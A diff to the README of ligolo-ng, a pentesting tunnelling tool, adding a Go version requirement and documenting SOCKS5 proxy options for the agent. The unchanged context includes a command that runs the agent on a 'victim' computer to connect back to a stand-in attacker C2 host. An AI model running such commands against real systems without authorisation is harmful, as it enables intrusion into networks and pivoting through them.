@@ -78,7 +78,7 @@ This allows running tools like *nmap* without the use of *proxychains* (simpler 
 Precompiled binaries (Windows/Linux/macOS) are available on the [Release page](https://github.com/tnpitsecurity/ligolo-ng/releases).
 
 ### Building Ligolo-ng
-Building *ligolo-ng*:
+Building *ligolo-ng* (Go >= 1.17 is required):
 
 ```shell
 $ go build -o agent cmd/agent/main.go
@@ -139,6 +139,8 @@ Start the *agent* on your target (victim) computer (no privileges are required!)
 ```shell
 $ ./agent -connect attacker_c2_server.com:11601
 ```
+
+> If you want to tunnel the connection over a SOCKS5 proxy, you can use the `--socks ip:port` option. You can specify SOCKS credentials using the `--socks-user` and `--socks-pass` arguments.
 
 A session should appear on the *proxy* server.
 
